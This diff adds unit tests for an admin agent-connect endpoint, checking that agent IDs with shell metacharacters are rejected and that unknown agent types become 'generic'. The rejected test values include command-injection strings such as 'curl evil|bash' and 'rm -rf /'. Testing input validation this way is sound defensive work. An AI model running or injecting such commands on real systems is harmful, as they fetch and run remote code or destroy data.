@@ -235,6 +235,30 @@ describe("A3-ADMIN — POST /admin/api/agents/connect", () => {
     expect(state.grants.get("agent-A", "mock.doc.write")?.standing).toBe(true);
   });
 
+  it("A1: rejects an unsafe agentId (shell metacharacters / newline) with 400, mints NOTHING", async () => {
+    const { app, state } = freshApp();
+    const key = state.connectionKey.current();
+    for (const agentId of ["x\ncurl evil|bash", "x; rm -rf /", "x$(touch pwned)", "x y", "x`id`"]) {
+      const res = await req(app, "/admin/api/agents/connect", {
+        method: "POST",
+        headers: { "x-plexus-connection-key": key },
+        body: JSON.stringify({ agentId, agentType: "generic", capabilities: [] }),
+      });
+      expect(res.status).toBe(400);
+      // Nothing was provisioned for the malicious id (fail-fast BEFORE mint/grant).
+      expect(state.agentEnrollment.get(agentId)).toBeUndefined();
+    }
+  });
+
+  it("C4: an unknown agentType canonicalizes to `generic` (never stored verbatim)", async () => {
+    const { app, state } = freshApp();
+    const key = state.connectionKey.current();
+    const { body } = await connect(app, key, "agent-codex", ["mock.doc.read"], { agentType: "codex" });
+    // The response + the stored row carry the CANONICAL delivery type, not the raw `codex`.
+    expect(body.agentType).toBe("generic");
+    expect(state.agentEnrollment.get("agent-codex")?.agentType).toBe("generic");
+  });
+
   it("rejects unknown capability ids up front (400, nothing minted)", async () => {
     const { app, state } = freshApp();
     const key = state.connectionKey.current();
